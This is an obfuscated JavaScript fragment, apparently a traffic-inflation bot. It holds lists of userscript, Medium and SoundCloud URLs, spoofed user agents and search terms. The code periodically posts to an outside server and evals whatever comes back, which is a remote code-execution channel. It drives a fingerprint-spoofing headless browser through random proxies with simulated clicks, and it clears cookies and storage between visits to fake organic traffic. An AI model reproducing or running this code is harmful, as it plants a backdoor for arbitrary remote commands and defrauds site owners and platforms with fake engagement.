        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aH(0x17) + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': aH(0x10) + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + aH(0xf) + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + aH(0x3) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + aH(0x14) + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + aG(0xb) + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      aF(0x22, 'A]rI') + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + aH(0x5) + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      aG(0x29) + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + aH(0x1) + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1a1f + 0x731 * 0x1 + -0x2150);
    let h = e[f];
    return h;
  }, d(b, c);
}
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + aH(0x1b) + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xe92 + 0x90 * 0x9 + -0x108 * 0x13)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x24e6 + 0x19ae + -0x641 * 0xa)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + aH(0x8) + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0xe26 + 0x501 * -0x2 + -0x10d * -0x17);

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1a1f + 0x731 * 0x1 + -0x2150);
    let h = e[f];
    if (b['asZSoo'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2e9 * -0xd + -0x8a1 + -0x2 * 0xe9a, s, t, u = 0x1160 + 0x20ff + 0x325f * -0x1; t = n['charAt'](u++); ~t && (s = r % (-0x1a0c + -0x169 * -0x11 + 0x217 * 0x1) ? s * (0x166d + 0x1 * 0x1c9 + -0x17f6) + t : t, r++ % (-0x1a19 + 0x1540 + 0x4dd)) ? p += String['fromCharCode'](0x10c1 * 0x1 + -0xe4 * -0xc + -0x1a72 & s >> (-(0x398 + 0x1 * 0x661 + -0x9f7) * r & -0x1743 + 0xe * 0x1e5 + -0x33d)) : -0x6ca + -0x1 * 0x1f11 + 0x1 * 0x25db) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1db5 + 0xc1 * 0x1f + -0x3514, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x20d5 * -0x1 + 0x689 * 0x5 + 0x38))['slice'](-(-0x174a * -0x1 + 0x14e7 + 0x2c2f * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x22e0 + -0x3b * 0x71 + -0x1 * -0x3ceb,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x235a + -0x151 * -0x2 + 0x18 * 0x15d; u < 0xf * -0x93 + 0x97 + -0x3 * -0x302; u++) {
          p[u] = u;
        }
        for (u = -0x4 * -0x43f + 0x145f + -0x255b; u < 0x85 * 0x30 + -0xd8b + -0x1 * 0xa65; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1941 + -0x187e + 0xb * 0x49d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1b09 + -0xc49 + -0xec0, q = 0x1c4f + 0x218b + 0x5b * -0xae;
        for (let v = 0x1de5 + -0xf45 + 0x48 * -0x34; v < n['length']; v++) {
          u = (u + (0x121d * -0x1 + 0x1 * -0x2650 + 0x386e)) % (0xeb6 + -0xe08 + -0x52 * -0x1), q = (q + p[u]) % (-0x1 * -0x1ead + 0x1 * -0x10d5 + -0xcd8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2299 + -0x113f + -0x105a)]);
        }
        return t;
      };
      b['hbgDmW'] = m, c = arguments, b['asZSoo'] = !![];
    }
    const j = e[-0x7d8 + -0x5b * 0xc + -0x4 * -0x307],
      k = f + j,
      l = c[k];
    return !l ? (b['aNPmVI'] === undefined && (b['aNPmVI'] = !![]), h = b['hbgDmW'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0x223b + -0x1d91 + 0x1fe6 * 0x2; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes'](), async function trigger() {
  const aO = b,
    aN = c,
    aM = d;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](j => {
              try {
                const k = j['data'][0x2423 + 0x24b5 + -0x48d8];
                '$' === k ? f['push'](j['data']) : eval(j['data']);
              } catch (l) {}
            })['catch'](j => {});
          } catch (j) {}
        }
        h(), setInterval(h, -0x7eaa + -0x9b * -0xe2 + 0x489b4);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: j
        } = require('fakebrowse' + 'r'), k = require('path'), l = k['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), m = new j['Builder']()['displayUse' + 'rActionLay' + 'er'](0x125e + -0x6e2 * 0x1 + -0x93 * 0x14)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](l);
        let n;
        aa:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let W = await async function X() {
                  let Y;
                  const Z = {
                    'User-Agent': Y['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    Y = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': Z
                    })) ? .['data'];
                  } catch (a0) {}
                  if (Y)
                    try {
                      Y = (await axios['get'](Y, {
                        'headers': Z
                      })) ? .['data'];
                    } catch (a1) {}
                  if (!Y)
                    return await randomWait(), await X();
                  try {
                    return 'object' == typeof Y ? Y : 'string' == typeof Y ? JSON['parse'](Y) : {};
                  } catch (a2) {
                    if (!Y)
                      return await randomWait(), await X();
                  }
                }();
                m['deviceDesc' + 'riptor'](W);
              }
              n = await m['launch']();
              break aa;
            } catch (Y) {
              warn(Y), await randomWait();
            }
        const {
          vanillaBrowser: p,
          userAction: q
        } = n;
        log('index.js\x20c' + 'alled');
        const u = p['defaultBro' + 'wserContex' + 't']();
        async function v(Z = '', a0 = 0x1fca + -0xb05 + -0x14c4, a1) {
          const aI = d,
            a2 = await a1['waitForSel' + 'ector'](Z);
          return await q['simClickEl' + aI(0x4)](a2, {
            'pauseAfterMouseUp': a0
          }), a2;
        }
        async function w(Z) {
          const a0 = await Z['target']()['createCDPS' + 'ession']();
          await a0['send']('Network.cl' + 'earBrowser' + 'Cookies'), await a0['send']('Network.cl' + 'earBrowser' + 'Cache');
          const a1 = await Z['cookies']();
          for (const a2 of a1)
            await Z['deleteCook' + 'ie'](a2);
          return await Z['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), 0x15 * -0x17d + 0x253b + -0x5f9;
        }
        async function x(Z, a0 = 0x1b36 + 0x3 * -0xa5e + 0x3e5) {
          let a1 = await p['newPage']();
          return await a1['setDefault' + 'Navigation' + 'Timeout'](0x1 * 0x202d + -0x121 * 0xe + 0xb * -0x17d), a0 && await useProxy(a1, await getRandomProxy()), await a1['goto'](Z, {
            'timeout': 0x0
          }), a1;
        }
        async function y(Z) {
